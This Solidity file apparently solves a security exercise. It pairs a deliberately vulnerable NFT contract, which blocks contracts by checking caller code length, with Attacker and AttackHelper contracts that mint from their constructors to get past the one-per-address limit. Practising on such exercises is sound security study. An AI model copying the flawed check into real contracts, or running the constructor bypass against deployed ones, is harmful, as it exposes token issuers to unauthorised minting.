// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "forge-std/console.sol";
// import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint3 is ERC721 {
    // using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        // isContract() is no longer provided in latest OpenZeppelin, but
        // I have replaced it with equivalent code.
        // require(!msg.sender.isContract(), "no contracts");
        require(!(address(msg.sender).code.length > 0), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }
}

contract Attacker {
    Overmint3 vault;
    address player;
    AttackHelper c1;
    AttackHelper c2;

    constructor(Overmint3 vault_, address player_) {
        vault = vault_;
        player = player_;

        c1 = new AttackHelper(vault, player);
        c1 = new AttackHelper(vault, player);
        c1 = new AttackHelper(vault, player);
        c1 = new AttackHelper(vault, player);
        c1 = new AttackHelper(vault, player);
    }

    function moveNft(uint256 id) external {
        address helper = msg.sender;
        vault.transferFrom(helper, player, id);
    }
}

contract AttackHelper {
    constructor(Overmint3 vault, address player) {
        uint256 id = vault.totalSupply() + 1;
        vault.mint();
        vault.transferFrom(address(this), player, id);
    }
}
